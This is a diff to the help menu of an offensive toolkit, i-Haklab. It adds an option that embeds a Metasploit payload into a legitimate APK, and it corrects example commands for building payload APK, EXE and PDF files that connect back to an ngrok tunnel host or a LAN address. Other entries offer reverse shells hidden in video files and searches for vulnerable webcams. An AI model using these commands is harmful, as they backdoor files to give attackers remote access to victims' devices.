@@ -203,12 +203,14 @@ $Y OPTIONS$W|$Y   Arguments$W   |$Y    Description$W
 |
 ╰───msf────+─dirscan─+─IPtarget─➤ Enumerate directories/subdirecotires from a server.
 |    |         ╰──example───────{─i-Haklab msf dirscan 10.10.10.242-}
+|    ╰─────+─embed──────────────➤ Embed a metasploit payload into legitim apk file.
+|              ╰─ex─for─outlan──{─i-Haklab msf embed 6.tcp.ngrok.io 4546 /path/to/file.apk
 |    ╰─────+─payapk─+─tun0:port─➤ Create a coded payload .apk
-|    |         ╰─ex─for─outlan──{─i-Haklab payapk 6.tcp.ngrok.io 23453─}
+|    |         ╰─ex─for─outlan──{─i-Haklab msf payapk 6.tcp.ngrok.io 23453─}
 |    ╰─────+─payexe─+─tun0:port─➤ Create a coded payload .exe
-|    |         ╰─ex─for─inlan───{─i-Haklab payexe 192.168.0.1 8080─}
+|    |         ╰─ex─for─inlan───{─i-Haklab msf payexe 192.168.0.1 8080─}
 |    ╰─────+─paypdf─+─tun0:port─➤ Create a coded payload .pdf
-|    |         ╰─ex─default─set─{─i-Haklab paypdf─}
+|    |         ╰─ex─default─set─{─i-Haklab msf paypdf─}
 |    ╰─────+──────shodan────────➤ Search vulnerable webcam servers using metasploit
 |
 ╰─payvid───➤────────────────────➤ Hide a Reverse Shell with a Video File by Exploiting Linux OS.
